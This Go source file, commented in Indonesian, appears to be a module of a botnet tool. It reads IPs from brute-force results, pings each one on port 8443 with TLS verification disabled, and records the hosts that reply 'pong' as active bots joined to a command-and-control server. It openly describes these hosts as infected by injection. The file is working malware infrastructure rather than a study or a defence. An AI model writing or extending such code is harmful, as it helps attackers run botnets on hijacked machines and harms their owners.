package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

func RunBotJoin() []string {
	fmt.Println("\033[33m\n[JOIN] Menghubungkan semua bot hasil inject ke C2...\033[0m")

	file, err := os.Open("brute_results.txt")
	if err != nil {
		fmt.Println("\033[31m[X] File brute_results.txt tidak ditemukan!\033[0m")
		return []string{}
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var bots []string

	// Buat HTTP client dengan HTTPS/TLS
	client := http.Client{
		Timeout: 3 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // Hanya untuk testing
			},
		},
	}

	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, "|")
		if len(parts) != 3 {
			continue
		}
		ip := parts[0]

		// Ganti http menjadi https dan port default 443
		url := fmt.Sprintf("https://%s:8443/ping", ip)
		
		resp, err := client.Get(url)
		if err != nil {
			fmt.Printf("\033[31m[X] Gagal ping ke %s\033[0m\n", ip)
			continue
		}

		defer resp.Body.Close()
		buf := make([]byte, 4096)
		n, _ := resp.Body.Read(buf)
		body := string(buf[:n])

		if resp.StatusCode == 200 && strings.Contains(strings.ToLower(body), "pong") {
			bots = append(bots, ip)
			fmt.Printf("\033[32m[✓] Bot aktif di %s\033[0m\n", ip)
		} else {
			fmt.Printf("\033[35m[!] Tidak merespon dari %s\033[0m\n", ip)
		}
	}

	if len(bots) > 0 {
		out, err := os.Create("bots.txt")
		if err == nil {
			for _, b := range bots {
				out.WriteString(b + "\n")
			}
			out.Close()
			fmt.Printf("\033[36m[✓] %d bot aktif, disimpan ke bots.txt ✔\033[0m\n", len(bots))
		}
	} else {
		fmt.Println("\033[31m[!] Tidak ada bot aktif ditemukan.\033[0m")
	}

	return bots
}
